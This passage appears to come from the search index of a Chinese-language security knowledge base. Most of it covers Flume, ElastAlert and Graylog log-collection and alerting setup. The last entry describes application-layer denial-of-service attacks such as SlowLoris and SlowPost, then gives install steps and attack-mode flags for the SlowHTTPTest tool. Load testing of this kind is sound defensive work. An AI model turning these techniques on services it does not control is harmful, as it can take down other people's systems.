exec-memory-avro.sources.exec-source.type = exec exec-memory-avro.sources.exec-source.command = tail -F /var/log/messages exec-memory-avro.sources.exec-source.shell = /bin/sh -c exec-memory-avro.sinks.avro-sink.type = avro exec-memory-avro.sinks.avro-sink.hostname = localhost exec-memory-avro.sinks.avro-sink.port = 44444 exec-memory-avro.channels.memory-channel.type = memory exec-memory-avro.channels.memory-channel.capacity = 1000 exec-memory-avro.channels.memory-channel.transactionCapacity = 100 exec-memory-avro.sources.exec-source.channels = memory-channel exec-memory-avro.sinks.avro-sink.channel = memory-channel \u5728server2\u521b\u5efa\u914d\u7f6e\u6587\u4ef6\uff1a vim /app/apache-flume-1.8.0-bin/conf/avro-memory-logger.conf avro-memory-logger.conf\u6587\u4ef6\u5185\u5bb9\uff1a avro-memory-logger.sources = avro-source avro-memory-logger.sinks = logger-sink avro-memory-logger.channels = memory-channel avro-memory-logger.sources.avro-source.type = avro avro-memory-logger.sources.avro-source.bind = localhost avro-memory-logger.sources.avro-source.port = 44444 avro-memory-logger.sinks.logger-sink.type = logger avro-memory-logger.channels.memory-channel.type = memory avro-memory-logger.channels.memory-channel.capacity = 1000 avro-memory-logger.channels.memory-channel.transactionCapacity = 100 avro-memory-logger.sources.avro-source.channels = memory-channel avro-memory-logger.sinks.logger-sink.channel = memory-channel \u6267\u884c\u547d\u4ee4\uff1a \u5148\u5728server2\u6267\u884c\uff0c\u518d\u6267\u884cserver1 flume-ng agent --name avro-memory-logger --conf /app/apache-flume-1.8.0-bin/conf \\ --conf-file /app/apache-flume-1.8.0-bin/conf/avro-memory-logger.conf \\ -Dflume.root.logger=INFO,console flume-ng agent --name exec-memory-avro --conf /app/apache-flume-1.8.0-bin/conf \\ --conf-file /app/apache-flume-1.8.0-bin/conf/exec-memory-avro.conf \\ -Dflume.root.logger=INFO,console","title":"Flume"},{"location":"infrastructure-security/host-security/log-analysis/#logstash","text":"\u5b98\u65b9\u6587\u6863","title":"Logstash"},{"location":"infrastructure-security/host-security/log-analysis/#_5","text":"","title":"\u65e5\u5fd7\u5904\u7406"},{"location":"infrastructure-security/host-security/log-analysis/#logstash-filter","text":"","title":"Logstash filter"},{"location":"infrastructure-security/host-security/log-analysis/#spark-or-storm","text":"","title":"Spark or Storm"},{"location":"infrastructure-security/host-security/log-analysis/#_6","text":"","title":"\u65e5\u5fd7\u5b58\u50a8"},{"location":"infrastructure-security/host-security/log-analysis/#database","text":"","title":"Database"},{"location":"infrastructure-security/host-security/log-analysis/#elasticsearch","text":"","title":"ElasticSearch"},{"location":"infrastructure-security/host-security/log-analysis/#hive","text":"","title":"Hive"},{"location":"infrastructure-security/host-security/log-analysis/#hbase","text":"","title":"HBase"},{"location":"infrastructure-security/host-security/log-analysis/#_7","text":"","title":"\u53ef\u89c6\u5316\u5c55\u793a(\u65e5\u5fd7\u4ef7\u503c)"},{"location":"infrastructure-security/host-security/log-analysis/#kibana","text":"","title":"Kibana"},{"location":"infrastructure-security/host-security/log-analysis/#graylog","text":"","title":"Graylog"},{"location":"infrastructure-security/host-security/log-analysis/#_8","text":"","title":"\u65e5\u5fd7\u5206\u6790\u5e73\u53f0\u5bf9\u6bd4"},{"location":"infrastructure-security/host-security/log-analysis/#_9","text":"\u51e0\u5341\u6761\u4e1a\u52a1\u7ebf\u65e5\u5fd7\u7cfb\u7edf\u5982\u4f55\u6536\u96c6\u5904\u7406\uff1f Splunk vs ELK","title":"\u53c2\u8003\u8d44\u6599"},{"location":"infrastructure-security/host-security/log-analysis/elk5-elastalert/","text":"ELK\u76d1\u63a7\u62a5\u8b66\u7cfb\u7edf-elastalert github\u5730\u5740 elastalert\u5b89\u88c5 # \u64cd\u4f5c\u7cfb\u7edf\uff1aCentos7 # \u89e3\u51b3python\u4f9d\u8d56 yum install epel-release -y yum install python2-pip.noarch gcc.x86_64 python-devel.x86_64 libffi-devel.x86_64 git.x86_64 -y pip install --upgrade pip pip install setuptools =11.3 pip install elasticsearch =5.0.0 # \u5b89\u88c5 git clone https://github.com/Yelp/elastalert.git cd elastalert/ pip install -r requirements.txt python setup.py install \u4f7f\u7528 \u521b\u5efa\u7d22\u5f15 elastalert-create-index \u6d4b\u8bd5\u89c4\u5219\u6587\u4ef6 elastalert-test-rule rule.yaml \u542f\u52a8\u76d1\u63a7\u62a5\u8b66 python -m elastalert.elastalert --verbose --rule /root/elastalert/example_rules/rule.yaml \u4ee5\u670d\u52a1\u542f\u52a8elastalert mkdir /etc/elastalert cp /root/elastalert/config.yaml.example /etc/elastalert/config.yaml # \u521b\u5efa\u89c4\u5219\u76ee\u5f55 mkdir /etc/elastalert/rules cp /root/elastalert/example_rules/example_frequency.yaml /etc/elastalert/rules/ cp /root/elastalert/example_rules/example_frequency.yaml /etc/elastalert/rules/rule.yaml # \u4fee\u6539\u914d\u7f6e\u6587\u4ef6 vim /etc/elastalert/config.yaml rules_folder: /etc/elastalert/rules # \u521b\u5efaelastalert\u670d\u52a1\u6587\u4ef6 vim /etc/systemd/system/elastalert.service elastalert.service\u6587\u4ef6\u5185\u5bb9\uff1a [Unit] Description=elastalert After=elasticsearch.service [Service] Type=simple User=root Group=root Restart=on-failure WorkingDirectory=/opt ExecStart=/usr/bin/python -m elastalert.elastalert --config /etc/elastalert/config.yaml --rule /etc/elastalert/rules/rule.yaml Install] WantedBy=multi-user.target \u542f\u52a8\u670d\u52a1\uff1a systemctl start elastalert.service config.yaml\u914d\u7f6e\u6587\u4ef6\u8bf4\u660e rules_folder: /etc/elastalert/rules # \u89c4\u5219\u76ee\u5f55 run_every: # \u591a\u4e45\u4eceES\u4e2d\u67e5\u8be2\u4e00\u6b21 minutes: 1 es_host: 172.16.64.171 es_port: 9200 writeback_index: elastalert_status # elastalert\u7d22\u5f15\u540d\u79f0 alert_time_limit: # \u5931\u8d25\u91cd\u8bd5\u9650\u5236 days: 2 \u90ae\u7bb1\u62a5\u8b66 vim /etc/elastalert/rules/rule.yaml rule.yaml\u6587\u4ef6\u5185\u5bb9\uff1a es_host: 127.0.0.1 es_port: 9200 # \u89c4\u5219\u540d\u5b57\uff0c\u552f\u4e00\u503c name: security test # \u62a5\u8b66\u7c7b\u578b\uff0c\u53c2\u8003\u5370\u8c61\u7b14\u8bb0 type: any # es\u7d22\u5f15 index: logstash-* # \u8fc7\u6ee4 filter: - query: query_string: query: message:test # \u62a5\u8b66\u7c7b\u578b alert: - email smtp_host: smtp.126.com smtp_port: 25 smtp_auth_file: smtp_auth_file.yaml email_reply_to: email1_address from_addr: email1_address # \u63a5\u53d7\u90ae\u7bb1 email: - email2_address \u521b\u5efa\u90ae\u7bb1\u5bc6\u7801\u6587\u4ef6: vim /etc/elastalert/rules/smtp_auth_file.yaml smtp_auth_file.yaml\u6587\u4ef6\u5185\u5bb9\uff1a user: username password: password \u9489\u9489\u62a5\u8b66 github\u5730\u5740 \u9489\u9489\u6d4b\u8bd5 curl 'https://oapi.dingtalk.com/robot/send?access_token=token\u503c' \\ -d '{ msgtype : text , text :{ content : test }}' \\ -H 'Content-Type:application/json' \u5b89\u88c5\u63d2\u4ef6 # \u4e0b\u8f7d git clone https://github.com/xuyaoqiang/elastalert-dingtalk-plugin.git # \u590d\u5236\u63d2\u4ef6\u5230elastalert\u4e2d cp -r elastalert-dingtalk-plugin/elastalert_modules/ /etc/elastalert/ \u914d\u7f6e\u89c4\u5219 vim /etc/elastalert/rules/rule.yaml rule.yaml\u6587\u4ef6\u5185\u5bb9\uff1a es_host: 127.0.0.1 es_port: 9200 name: security type: any index: logstash # \u67e5\u8be2\u6a21\u5f0f filter: - query: query_string: query: message:test # \u62a5\u8b66\u6a21\u5f0f alert: - elastalert_modules.dingtalk_alert.DingTalkAlerter # \u9489\u9489\u7684webhook\u63a5\u53e3 dingtalk_webhook: dingtalk_msgtype: text \u542f\u52a8\u76d1\u63a7\u62a5\u8b66: python -m elastalert.elastalert --verbose --config /etc/elastalert/config.yaml --rule /etc/elastalert/rules/rule.yaml \u914d\u7f6e\u670d\u52a1\u542f\u52a8 vim /etc/systemd/system/elastalert.service elastalert.service\u6587\u4ef6\u5185\u5bb9\uff1a [Unit] Description=elastalert After=elasticsearch.service [Service] Type=simple User=root Group=root Restart=on-failure WorkingDirectory=/opt ExecStart=cd /etc/elastalert /usr/bin/python -m elastalert.elastalert --config /etc/elastalert/config.yaml --rule /etc/elastalert/rules/rule.yaml Install] WantedBy=multi-user.target \u4f18\u5316\u62a5\u8b66\u683c\u5f0f # \u6ce8\u610f\u4e0a\u4e0b\u5b57\u6bb5\u5bf9\u5e94 alert_text: | kibana_url: https://hostname:5601/app/kibana alarm_reason: 1\u5206\u949f\u5185login.php\u81f3\u5c11\u88ab\u8bbf\u95ee10\u6b21 alarm_name: {} request_uri: {} request_ip: {} response_status: {} alert_text_args: - name - request - clientip - response alert_text_type: alert_text_only elastalert-kibana-plugin github\u5730\u5740 \u53c2\u8003\u8d44\u6599 \u4e00\u4e2a\u4eba\u7684\u5b89\u5168\u90e8\u4e4bELK\u63a5\u6536Paloalto\u65e5\u5fd7\u5e76\u7528\u9489\u9489\u544a\u8b66 \u57fa\u4e8eElastalert\u7684\u5b89\u5168\u544a\u8b66\u5256\u6790","title":"ELK\u76d1\u63a7\u62a5\u8b66\u7cfb\u7edf-elastalert"},{"location":"infrastructure-security/host-security/log-analysis/elk5-elastalert/#elk-elastalert","text":"github\u5730\u5740","title":"ELK\u76d1\u63a7\u62a5\u8b66\u7cfb\u7edf-elastalert"},{"location":"infrastructure-security/host-security/log-analysis/elk5-elastalert/#elastalert","text":"# \u64cd\u4f5c\u7cfb\u7edf\uff1aCentos7 # \u89e3\u51b3python\u4f9d\u8d56 yum install epel-release -y yum install python2-pip.noarch gcc.x86_64 python-devel.x86_64 libffi-devel.x86_64 git.x86_64 -y pip install --upgrade pip pip install setuptools =11.3 pip install elasticsearch =5.0.0 # \u5b89\u88c5 git clone https://github.com/Yelp/elastalert.git cd elastalert/ pip install -r requirements.txt python setup.py install","title":"elastalert\u5b89\u88c5"},{"location":"infrastructure-security/host-security/log-analysis/elk5-elastalert/#_1","text":"\u521b\u5efa\u7d22\u5f15 elastalert-create-index \u6d4b\u8bd5\u89c4\u5219\u6587\u4ef6 elastalert-test-rule rule.yaml \u542f\u52a8\u76d1\u63a7\u62a5\u8b66 python -m elastalert.elastalert --verbose --rule /root/elastalert/example_rules/rule.yaml","title":"\u4f7f\u7528"},{"location":"infrastructure-security/host-security/log-analysis/elk5-elastalert/#elastalert_1","text":"mkdir /etc/elastalert cp /root/elastalert/config.yaml.example /etc/elastalert/config.yaml # \u521b\u5efa\u89c4\u5219\u76ee\u5f55 mkdir /etc/elastalert/rules cp /root/elastalert/example_rules/example_frequency.yaml /etc/elastalert/rules/ cp /root/elastalert/example_rules/example_frequency.yaml /etc/elastalert/rules/rule.yaml # \u4fee\u6539\u914d\u7f6e\u6587\u4ef6 vim /etc/elastalert/config.yaml rules_folder: /etc/elastalert/rules # \u521b\u5efaelastalert\u670d\u52a1\u6587\u4ef6 vim /etc/systemd/system/elastalert.service elastalert.service\u6587\u4ef6\u5185\u5bb9\uff1a [Unit] Description=elastalert After=elasticsearch.service [Service] Type=simple User=root Group=root Restart=on-failure WorkingDirectory=/opt ExecStart=/usr/bin/python -m elastalert.elastalert --config /etc/elastalert/config.yaml --rule /etc/elastalert/rules/rule.yaml Install] WantedBy=multi-user.target \u542f\u52a8\u670d\u52a1\uff1a systemctl start elastalert.service","title":"\u4ee5\u670d\u52a1\u542f\u52a8elastalert"},{"location":"infrastructure-security/host-security/log-analysis/elk5-elastalert/#configyaml","text":"rules_folder: /etc/elastalert/rules # \u89c4\u5219\u76ee\u5f55 run_every: # \u591a\u4e45\u4eceES\u4e2d\u67e5\u8be2\u4e00\u6b21 minutes: 1 es_host: 172.16.64.171 es_port: 9200 writeback_index: elastalert_status # elastalert\u7d22\u5f15\u540d\u79f0 alert_time_limit: # \u5931\u8d25\u91cd\u8bd5\u9650\u5236 days: 2","title":"config.yaml\u914d\u7f6e\u6587\u4ef6\u8bf4\u660e"},{"location":"infrastructure-security/host-security/log-analysis/elk5-elastalert/#_2","text":"vim /etc/elastalert/rules/rule.yaml rule.yaml\u6587\u4ef6\u5185\u5bb9\uff1a es_host: 127.0.0.1 es_port: 9200 # \u89c4\u5219\u540d\u5b57\uff0c\u552f\u4e00\u503c name: security test # \u62a5\u8b66\u7c7b\u578b\uff0c\u53c2\u8003\u5370\u8c61\u7b14\u8bb0 type: any # es\u7d22\u5f15 index: logstash-* # \u8fc7\u6ee4 filter: - query: query_string: query: message:test # \u62a5\u8b66\u7c7b\u578b alert: - email smtp_host: smtp.126.com smtp_port: 25 smtp_auth_file: smtp_auth_file.yaml email_reply_to: email1_address from_addr: email1_address # \u63a5\u53d7\u90ae\u7bb1 email: - email2_address \u521b\u5efa\u90ae\u7bb1\u5bc6\u7801\u6587\u4ef6: vim /etc/elastalert/rules/smtp_auth_file.yaml smtp_auth_file.yaml\u6587\u4ef6\u5185\u5bb9\uff1a user: username password: password","title":"\u90ae\u7bb1\u62a5\u8b66"},{"location":"infrastructure-security/host-security/log-analysis/elk5-elastalert/#_3","text":"github\u5730\u5740 \u9489\u9489\u6d4b\u8bd5 curl 'https://oapi.dingtalk.com/robot/send?access_token=token\u503c' \\ -d '{ msgtype : text , text :{ content : test }}' \\ -H 'Content-Type:application/json' \u5b89\u88c5\u63d2\u4ef6 # \u4e0b\u8f7d git clone https://github.com/xuyaoqiang/elastalert-dingtalk-plugin.git # \u590d\u5236\u63d2\u4ef6\u5230elastalert\u4e2d cp -r elastalert-dingtalk-plugin/elastalert_modules/ /etc/elastalert/ \u914d\u7f6e\u89c4\u5219 vim /etc/elastalert/rules/rule.yaml rule.yaml\u6587\u4ef6\u5185\u5bb9\uff1a es_host: 127.0.0.1 es_port: 9200 name: security type: any index: logstash # \u67e5\u8be2\u6a21\u5f0f filter: - query: query_string: query: message:test # \u62a5\u8b66\u6a21\u5f0f alert: - elastalert_modules.dingtalk_alert.DingTalkAlerter # \u9489\u9489\u7684webhook\u63a5\u53e3 dingtalk_webhook: dingtalk_msgtype: text \u542f\u52a8\u76d1\u63a7\u62a5\u8b66: python -m elastalert.elastalert --verbose --config /etc/elastalert/config.yaml --rule /etc/elastalert/rules/rule.yaml \u914d\u7f6e\u670d\u52a1\u542f\u52a8 vim /etc/systemd/system/elastalert.service elastalert.service\u6587\u4ef6\u5185\u5bb9\uff1a [Unit] Description=elastalert After=elasticsearch.service [Service] Type=simple User=root Group=root Restart=on-failure WorkingDirectory=/opt ExecStart=cd /etc/elastalert /usr/bin/python -m elastalert.elastalert --config /etc/elastalert/config.yaml --rule /etc/elastalert/rules/rule.yaml Install] WantedBy=multi-user.target \u4f18\u5316\u62a5\u8b66\u683c\u5f0f # \u6ce8\u610f\u4e0a\u4e0b\u5b57\u6bb5\u5bf9\u5e94 alert_text: | kibana_url: https://hostname:5601/app/kibana alarm_reason: 1\u5206\u949f\u5185login.php\u81f3\u5c11\u88ab\u8bbf\u95ee10\u6b21 alarm_name: {} request_uri: {} request_ip: {} response_status: {} alert_text_args: - name - request - clientip - response alert_text_type: alert_text_only","title":"\u9489\u9489\u62a5\u8b66"},{"location":"infrastructure-security/host-security/log-analysis/elk5-elastalert/#elastalert-kibana-plugin","text":"github\u5730\u5740","title":"elastalert-kibana-plugin"},{"location":"infrastructure-security/host-security/log-analysis/elk5-elastalert/#_4","text":"\u4e00\u4e2a\u4eba\u7684\u5b89\u5168\u90e8\u4e4bELK\u63a5\u6536Paloalto\u65e5\u5fd7\u5e76\u7528\u9489\u9489\u544a\u8b66 \u57fa\u4e8eElastalert\u7684\u5b89\u5168\u544a\u8b66\u5256\u6790","title":"\u53c2\u8003\u8d44\u6599"},{"location":"infrastructure-security/host-security/log-analysis/graylog1/","text":"Graylog\u65e5\u5fd7\u7ba1\u7406\u7cfb\u7edf \u5b98\u7f51\u5730\u5740 \u5b98\u65b9\u6587\u6863 \u5b89\u88c5\u4e0e\u4f7f\u7528 \u5b89\u88c5graylog \u89e3\u51b3\u4f9d\u8d56 # java =8 yum install java-1.8.0-openjdk.x86_64 java-1.8.0-openjdk-devel.x86_64 -y # MongoDB =2.4 yum install epel-release -y yum install mongodb.x86_64 mongodb-server.x86_64 -y # \u542f\u52a8MongoDB systemctl start mongod.service # ElasticSearch =2.x and = 6.x rpm -ivh elasticsearch-5.6.13.rpm # \u542f\u52a8ElasticSearch systemctl start elasticsearch.service \u5b89\u88c5graylog rpm -Uvh https://packages.graylog2.org/repo/packages/graylog-2.4-repository_latest.rpm yum install graylog-server -y \u914d\u7f6e\u6587\u4ef6 vim /etc/graylog/server/server.conf # \u5e38\u89c4\u914d\u7f6e is_master = true # \u662f\u5426\u662f\u4e3b\u8282\u70b9 password+secret = secret # \u8bbe\u7f6e\u5bc6\u94a5 root_username = admin # \u9ed8\u8ba4\u7528\u6237 root_password_sha2 = SHA2 # \u5bc6\u7801\u7684SHA2 hash\u503c # REST API\u5730\u5740 rest_listen_uri = http://0.0.0.0:9000/api/ # Web\u5730\u5740 web_listen_uri = http://0.0.0.0:9000/ # ES\u5730\u5740 elasticsearch_hosts = http://node1:9200 # MongoDB\u914d\u7f6e mongodb_uri = mongodb://localhost/graylog \u751f\u6210\u5bc6\u94a5 yum install pwgen.x86_64 -y pwgen -N 1 -s 96 \u751f\u6210\u5bc6\u7801\u7684SHA2 echo -n Enter Password: head -1 /dev/stdin | tr -d '\\n' | sha256sum | cut -d -f1 \u542f\u52a8\u670d\u52a1 systemctl start graylog-server \u914d\u7f6e\u5f55\u5165\u6570\u636e system/overview-inputs \u914d\u7f6ersyslog vim /etc/rsyslog.d/graylog.conf graylog.conf\u6587\u4ef6\u5185\u5bb9 *.* @@10.10.10.5:5140;RSYSLOG_SyslogProtocol23Format \u91cd\u542frsyslog\u670d\u52a1 systemctl restart rsyslog.service \u70b9\u51fb\uff1ashow received messages \u53c2\u8003\u8d44\u6599 Sending syslog from Linux systems into Graylog","title":"Graylog\u65e5\u5fd7\u7ba1\u7406\u7cfb\u7edf"},{"location":"infrastructure-security/host-security/log-analysis/graylog1/#graylog","text":"\u5b98\u7f51\u5730\u5740 \u5b98\u65b9\u6587\u6863","title":"Graylog\u65e5\u5fd7\u7ba1\u7406\u7cfb\u7edf"},{"location":"infrastructure-security/host-security/log-analysis/graylog1/#_1","text":"","title":"\u5b89\u88c5\u4e0e\u4f7f\u7528"},{"location":"infrastructure-security/host-security/log-analysis/graylog1/#graylog_1","text":"\u89e3\u51b3\u4f9d\u8d56 # java =8 yum install java-1.8.0-openjdk.x86_64 java-1.8.0-openjdk-devel.x86_64 -y # MongoDB =2.4 yum install epel-release -y yum install mongodb.x86_64 mongodb-server.x86_64 -y # \u542f\u52a8MongoDB systemctl start mongod.service # ElasticSearch =2.x and = 6.x rpm -ivh elasticsearch-5.6.13.rpm # \u542f\u52a8ElasticSearch systemctl start elasticsearch.service \u5b89\u88c5graylog rpm -Uvh https://packages.graylog2.org/repo/packages/graylog-2.4-repository_latest.rpm yum install graylog-server -y","title":"\u5b89\u88c5graylog"},{"location":"infrastructure-security/host-security/log-analysis/graylog1/#_2","text":"vim /etc/graylog/server/server.conf # \u5e38\u89c4\u914d\u7f6e is_master = true # \u662f\u5426\u662f\u4e3b\u8282\u70b9 password+secret = secret # \u8bbe\u7f6e\u5bc6\u94a5 root_username = admin # \u9ed8\u8ba4\u7528\u6237 root_password_sha2 = SHA2 # \u5bc6\u7801\u7684SHA2 hash\u503c # REST API\u5730\u5740 rest_listen_uri = http://0.0.0.0:9000/api/ # Web\u5730\u5740 web_listen_uri = http://0.0.0.0:9000/ # ES\u5730\u5740 elasticsearch_hosts = http://node1:9200 # MongoDB\u914d\u7f6e mongodb_uri = mongodb://localhost/graylog \u751f\u6210\u5bc6\u94a5 yum install pwgen.x86_64 -y pwgen -N 1 -s 96 \u751f\u6210\u5bc6\u7801\u7684SHA2 echo -n Enter Password: head -1 /dev/stdin | tr -d '\\n' | sha256sum | cut -d -f1 \u542f\u52a8\u670d\u52a1 systemctl start graylog-server","title":"\u914d\u7f6e\u6587\u4ef6"},{"location":"infrastructure-security/host-security/log-analysis/graylog1/#_3","text":"system/overview-inputs \u914d\u7f6ersyslog vim /etc/rsyslog.d/graylog.conf graylog.conf\u6587\u4ef6\u5185\u5bb9 *.* @@10.10.10.5:5140;RSYSLOG_SyslogProtocol23Format \u91cd\u542frsyslog\u670d\u52a1 systemctl restart rsyslog.service \u70b9\u51fb\uff1ashow received messages","title":"\u914d\u7f6e\u5f55\u5165\u6570\u636e"},{"location":"infrastructure-security/host-security/log-analysis/graylog1/#_4","text":"Sending syslog from Linux systems into Graylog","title":"\u53c2\u8003\u8d44\u6599"},{"location":"infrastructure-security/host-security/log-analysis/graylog2-advanced/","text":"Graylog\u9ad8\u7ea7\u4f7f\u7528 Graylog\u89e3\u6790Nginx\u65e5\u5fd7 \u6570\u636e\u6d41\u5411\uff1aFilebeat- Collector- Filebeat-Graylog Server \u521b\u5efa\u4e00\u4e2aBeats\u7c7b\u578b\u7684Inputs system/overview-Inputs \u914d\u7f6eCollector\u6536\u96c6\u65e5\u5fd7 system/overview-Collector-Mange Configurations-Create configration \u4fee\u6539\u914d\u7f6e-Create Output-Filebeat Output \u4fee\u6539\u914d\u7f6e-Create Input-Filebeat Input\uff0c\u8bb0\u5f97\u4fee\u6539Nginx\u65e5\u5fd7\u6587\u4ef6\u8def\u5f84 \u4fee\u6539\u6807\u7b7e Collector\u914d\u7f6e \u5b89\u88c5collector wget https://github.com/Graylog2/collector-sidecar/releases/download/0.1.7/collector-sidecar-0.1.7-1.x86_64.rpm rpm -ivh collector-sidecar-0.1.7-1.x86_64.rpm \u914d\u7f6ecollector vim /etc/graylog/collector-sidecar/collector_sidecar.yml # \u4fee\u6539tag\u6807\u7b7e\u5c31\u597d\u4e86 \u542f\u52a8collector graylog-collector-sidecar install \u914d\u7f6e\u89e3\u6790IP \u4e0b\u8f7d\u89e3\u6790\u6587\u4ef6 \u4e0b\u8f7d\u5730\u5740 # \u89e3\u538b\u5e76\u5b58\u653e\u6587\u4ef6\u5230\u6307\u5b9a\u8def\u5f84 tar -xf GeoLite2-City.tar.gz mv GeoLite2-City_20181218/GeoLite2-City.mmdb /etc/graylog/server/ tar -xf GeoLite2-Country.tar.gz mv GeoLite2-Country_20181218/GeoLite2-Country.mmdb /etc/graylog/server/ \u4fee\u6539Inputs\u7684Manage Extractors Add extractor-Load Message\uff08\u5907\u6ce8\uff1a\u518d\u6b21\u4e4b\u524d\uff0c\u5fc5\u987b\u4fdd\u8bc1\u4f60\u7684Ningx\u65e5\u5fd7\u6587\u4ef6\u4e2d\u6709\u65e5\u5fd7\u4fe1\u606f\uff09 \u5728message\u7684\u53f3\u4fa7\uff0c\u9009\u62e9Select extractor tyep\u4e3aGrok Pattern \u914d\u7f6e\u89e3\u6790\u5e93 system/overview-Configurations-Geo-Location Processor \u70b9\u51fbupdate \u6548\u679c\u56fe \u53c2\u8003\u8d44\u6599 Graylog\u5206\u6790Nginx\u65e5\u5fd7\u5e76\u901a\u8fc7GeoIP2\u83b7\u53d6\u8bbf\u95ee\u8005IP\u7684\u5730\u7406\u4f4d\u7f6e\u4fe1\u606f","title":"Graylog\u9ad8\u7ea7\u4f7f\u7528"},{"location":"infrastructure-security/host-security/log-analysis/graylog2-advanced/#graylog","text":"","title":"Graylog\u9ad8\u7ea7\u4f7f\u7528"},{"location":"infrastructure-security/host-security/log-analysis/graylog2-advanced/#graylognginx","text":"\u6570\u636e\u6d41\u5411\uff1aFilebeat- Collector- Filebeat-Graylog Server","title":"Graylog\u89e3\u6790Nginx\u65e5\u5fd7"},{"location":"infrastructure-security/host-security/log-analysis/graylog2-advanced/#beatsinputs","text":"system/overview-Inputs","title":"\u521b\u5efa\u4e00\u4e2aBeats\u7c7b\u578b\u7684Inputs"},{"location":"infrastructure-security/host-security/log-analysis/graylog2-advanced/#collector","text":"system/overview-Collector-Mange Configurations-Create configration \u4fee\u6539\u914d\u7f6e-Create Output-Filebeat Output \u4fee\u6539\u914d\u7f6e-Create Input-Filebeat Input\uff0c\u8bb0\u5f97\u4fee\u6539Nginx\u65e5\u5fd7\u6587\u4ef6\u8def\u5f84 \u4fee\u6539\u6807\u7b7e","title":"\u914d\u7f6eCollector\u6536\u96c6\u65e5\u5fd7"},{"location":"infrastructure-security/host-security/log-analysis/graylog2-advanced/#collector_1","text":"\u5b89\u88c5collector wget https://github.com/Graylog2/collector-sidecar/releases/download/0.1.7/collector-sidecar-0.1.7-1.x86_64.rpm rpm -ivh collector-sidecar-0.1.7-1.x86_64.rpm \u914d\u7f6ecollector vim /etc/graylog/collector-sidecar/collector_sidecar.yml # \u4fee\u6539tag\u6807\u7b7e\u5c31\u597d\u4e86 \u542f\u52a8collector graylog-collector-sidecar install","title":"Collector\u914d\u7f6e"},{"location":"infrastructure-security/host-security/log-analysis/graylog2-advanced/#ip","text":"\u4e0b\u8f7d\u89e3\u6790\u6587\u4ef6 \u4e0b\u8f7d\u5730\u5740 # \u89e3\u538b\u5e76\u5b58\u653e\u6587\u4ef6\u5230\u6307\u5b9a\u8def\u5f84 tar -xf GeoLite2-City.tar.gz mv GeoLite2-City_20181218/GeoLite2-City.mmdb /etc/graylog/server/ tar -xf GeoLite2-Country.tar.gz mv GeoLite2-Country_20181218/GeoLite2-Country.mmdb /etc/graylog/server/ \u4fee\u6539Inputs\u7684Manage Extractors Add extractor-Load Message\uff08\u5907\u6ce8\uff1a\u518d\u6b21\u4e4b\u524d\uff0c\u5fc5\u987b\u4fdd\u8bc1\u4f60\u7684Ningx\u65e5\u5fd7\u6587\u4ef6\u4e2d\u6709\u65e5\u5fd7\u4fe1\u606f\uff09 \u5728message\u7684\u53f3\u4fa7\uff0c\u9009\u62e9Select extractor tyep\u4e3aGrok Pattern \u914d\u7f6e\u89e3\u6790\u5e93 system/overview-Configurations-Geo-Location Processor \u70b9\u51fbupdate \u6548\u679c\u56fe","title":"\u914d\u7f6e\u89e3\u6790IP"},{"location":"infrastructure-security/host-security/log-analysis/graylog2-advanced/#_1","text":"Graylog\u5206\u6790Nginx\u65e5\u5fd7\u5e76\u901a\u8fc7GeoIP2\u83b7\u53d6\u8bbf\u95ee\u8005IP\u7684\u5730\u7406\u4f4d\u7f6e\u4fe1\u606f","title":"\u53c2\u8003\u8d44\u6599"},{"location":"infrastructure-security/network-security/","text":"\u7f51\u7edc\u5b89\u5168","title":"\u7f51\u7edc\u5b89\u5168"},{"location":"infrastructure-security/network-security/#_1","text":"","title":"\u7f51\u7edc\u5b89\u5168"},{"location":"infrastructure-security/network-security/cc-dos-ddos/cc/","text":"\u5e94\u7528\u5c42\u62d2\u7edd\u670d\u52a1\u653b\u51fb CC\uff08Chanllenge Collapsar\uff09\uff1aCC\u5c31\u662fDDoS\u7684\u4e00\u79cd\u3002 \u901a\u8fc7\u63a7\u5236\u67d0\u4e9b\u4e3b\u673a\u8865\u4e01\u53d1\u9001\u5927\u91cf\u6570\u636e\u5305\u7ed9\u670d\u52a1\u5668\u9020\u6210\u670d\u52a1\u5668\u8d44\u6e90\u8017\u5c3d\uff0c\u4e00\u76f4\u5230\u5b95\u673a\u5d29\u6e83\uff0c\u5e38\u7528\u4e8e\u653b\u51fb\u9875\u9762\u3002 \u5e94\u7528\u5c42\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u5206\u7c7b Get-Flood \u76f4\u63a5\u5bf9\u8f83\u4e3a\u6d88\u8017\u8d44\u6e90\u7684URL\u8fdb\u884c\u5927\u91cf\u7684\u8bf7\u6c42\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u591a\u4e2aURL\u5e76\u53d1\uff0c\u5355\u4e00URL\u5e76\u53d1\u8bf7\u6c42\uff0c\u968f\u673aURL\u8bf7\u6c42\u7b49\u3002 SlowLoris \u4e5f\u79f0\u4e3aslow headers\uff0c\u653b\u51fb\u8005\u59cb\u7ec8\u6784\u9020\u4e0d\u5b8c\u6574\u7684http header\u53d1\u9001\uff0c\u540c\u65f6\u8fd8\u95f4\u9694\u4e00\u5b9a\u65f6\u95f4\u518d\u53d1\u9001\u6570\u636e\uff0c\u5bfc\u81f4\u670d\u52a1\u5668\u4e00\u76f4\u5904\u4e8e\u7b49\u5f85\u72b6\u6001\u3002 SlowPost \u4e5f\u79f0\u4e3aslow body\uff0c\u653b\u51fb\u7684\u91cd\u70b9\u5728POST\u6570\u636e\u4e0a\uff0c\u901a\u8fc7\u5c06HTTP Header\u4e2d\u7684Content-Length\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u8f83\u5927\u7684\u503c\uff0c\u540c\u65f6\u8fd8\u95f4\u9694\u4e00\u5b9a\u65f6\u95f4\u518d\u53d1\u9001\u6570\u636e\uff0c\u5bfc\u81f4\u670d\u52a1\u5668\u4e00\u76f4\u5904\u4e8e\u7b49\u5f85\u72b6\u6001\u4e2d\u3002 SlowRead \u628awindow\u7a97\u53e3\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u975e\u5e38\u5c0f\u7684\u503c\uff0c\u8ba9\u670d\u52a1\u5668\u59cb\u7ec8\u51c6\u5907\u56de\u5e94\u6570\u636e\u3002 HashDos \u6d4b\u8bd5\u5de5\u5177 SlowHTTPTest github\u5730\u5740 Centos7\u7f16\u8bd1\u5b89\u88c5SlowHTTPTest yum install gcc.x86_64 gcc-c++.x86_64 openssl-devel.x86_64 -y yum install automake.noarch autoconf.noarch -y git clone https://github.com/shekyan/slowhttptest cd slowhttptest ./configure autoreconf -ivf make make install SlowHTTPTest\u4f7f\u7528 -H SlowLoris\u6a21\u5f0f -B SlowPost\u6a21\u5f0f -R Range 